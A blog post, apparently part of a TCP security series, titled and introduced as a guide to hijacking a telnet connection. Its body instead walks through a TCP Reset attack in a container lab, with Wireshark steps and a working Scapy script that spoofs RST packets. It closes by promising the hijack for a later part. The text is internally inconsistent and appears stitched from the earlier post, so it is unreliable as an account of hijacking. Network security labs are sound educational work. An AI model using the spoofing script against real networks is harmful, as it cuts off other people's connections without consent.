---
title: "Exploring Vulnerabilities in TCP. Part 2: Hijacking a TCP connection."
date: 2023-04-30
permalink: /posts/2023/04/tcp/hijack
tags:
  - network
  - security
  - telnet
  - tcp
  - netcat
---

We hijack a TCP connection.


### _Updated: May 1, 2023_


# Motivation

In the first part of this series, we conducted a TCP Reset attack on a `telnet` connection between two users on the same LAN as a malicious actor.

In this second installment, we will hijack the `telnet` connection and execute an arbitrary command.


# Container Environment

The set up is the same as the [previous post](/posts/2023/04/tcp/reset).

 
# Hijacking a telnet Connection

For this demonstration, I will show how an attacker on the same LAN as two machines that have an existing telnet connection can disrupt the connection by spoofing a properly constructed packet.

I first use `telnet` to connect from User 1 to User 2.

Then, I open Wireshark and monitor the LAN interface. I select the bridge interface starting with "br-". The characters following may change if you stop and start the containers in a separate occurrence.

<figure>
  <img src="/images/2023-04-26-tcp-reset/wireshark-init.png" alt="Wireshark Init Page">
  <figcaption>Select the bridge interface.</figcaption>
</figure>


In the `telnet` connection, I run a command like `echo hello` to generate some traffic over the `telnet` connection. 

<figure>
  <img src="/images/2023-04-26-tcp-reset/telnet-init.png" alt="A telnet connection">
  <figcaption>The existing telnet connection with a command executed.</figcaption>
</figure>

The last TCP packet sent from User 1 to User 2 will inform the source port number and sequence number used in the RST packet we will spoof from the attacker.

<figure>
  <img src="/images/2023-04-26-tcp-reset/wireshark.png" alt="Wireshark screen capture">
  <figcaption>Using Wireshark to construct our RST packet.</figcaption>
</figure>

The following code will send our RST packet:

```python
from scapy.all import * 
import argparse
 
def spoof_reset_packet(src_port, seq_num):
  user1_ip = "10.9.0.6"
  user2_ip = "10.9.0.7"
  
  user1_port = src_port
  user2_port = 23
  
  ip = IP(src=user1_ip, dst=user2_ip)
  tcp = TCP(sport=user1_port, dport=user2_port, flags="R", seq=seq_num)
  pkt = ip/tcp
  
  print("SENDING RESET PACKET........")
  send(pkt, verbose=0)
   
if __name__ == "__main__":
  parser = argparse.ArgumentParser()
  parser.add_argument("-p", "--src_port", type=int, help="source port", required=True)
  parser.add_argument("-s", "--seq", type=int, help="last sequence number", required=True)

  args = parser.parse_args()
  spoof_reset_packet(args.src_port, args.seq)
```

For convenience, I designed the program to take in arguments for the source port number and the sequence number. I invoke it as follows with the source port and sequence numbers taken from Wireshark.

<figure>
  <img src="/images/2023-04-26-tcp-reset/reset-attack.png" alt="Program invocation">
  <figcaption>Running the attack program with arguments for source port and sequence number.</figcaption>
</figure>

When we go back to the `telnet` connection, we see that the connection was disconnected.

<figure>
  <img src="/images/2023-04-26-tcp-reset/reset-connection.png" alt="Broken telnet connection">
  <figcaption>The telnet connection is reset.</figcaption>
</figure>


# That's it!

In this post, we learned about some of the security vulnerabilities of in TCP.

In the next part, we will expand on the knowledge gained from conducting the RST attack to hijack the `telnet` connection to run an arbitrary command.